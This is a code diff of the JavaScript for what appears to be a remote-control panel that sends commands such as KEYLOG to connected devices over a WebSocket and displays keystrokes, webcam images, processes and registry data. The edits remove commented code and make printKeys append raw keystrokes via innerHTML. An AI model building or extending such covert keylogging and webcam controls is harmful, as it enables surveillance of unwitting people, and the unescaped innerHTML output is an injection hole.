@@ -103,15 +103,6 @@ function sendCommand(command) {
         }));
     }
 
-    // else if (command === "keylog") {
-    //     ws.send(JSON.stringify({
-    //         type: "command",
-    //         from: clientName,
-    //         to: selectedDevice,
-    //         command: 'KEYLOG'
-    //     }));
-    // }
-
     else {
         ws.send(JSON.stringify({
             type: "command",
@@ -132,12 +123,9 @@ function handleResponse(msg) {
 
     switch (activePanel.id) {
         case "keylog":
-            printKeys(msg.data);
+            if (msg.command === "print")
+                printKeys(msg.data);
             break;
-
-        // case "shutdown":
-        //     renderProcessTab(data);
-        //     break;
 
         case "registry":
             //renderRegistryTab(data);
@@ -178,18 +166,6 @@ function handleResponse(msg) {
         default:
             return;
     }
-
-    // if (activePanel.id === "screenshot") {
-    //     // If it's image base64 → display image
-    //     const img = document.createElement("img");
-    //     img.src = "data:image/png;base64," + msg.data;
-    //     img.style.maxWidth = "100%";
-
-    //     activePanel.innerHTML = "";
-    //     activePanel.appendChild(img);
-    // } else {
-    //     activePanel.innerText = raw;
-    // }
 }
 
 function renderProcessTab(data) {
@@ -283,8 +259,7 @@ function displayWebcam(img) {
 }
 
 function printKeys(keys) {
-    let pEle = document.getElementById("keys-data");
-    pEle.textContent = keys;
+    document.getElementById("keylog-result").innerHTML += `${keys} <br>`;
 }
 
 document.getElementById("save-btn").addEventListener('click', () => {
@@ -315,7 +290,7 @@ document.querySelectorAll(".tab").forEach(tab => {
         document.getElementById(target).classList.add("active");
 
         // send command based on tab
-        if (target === "keylog") sendCommand(target);
+        if (target === "keylog") sendCommand(target.toUpperCase());
     };
 });
 
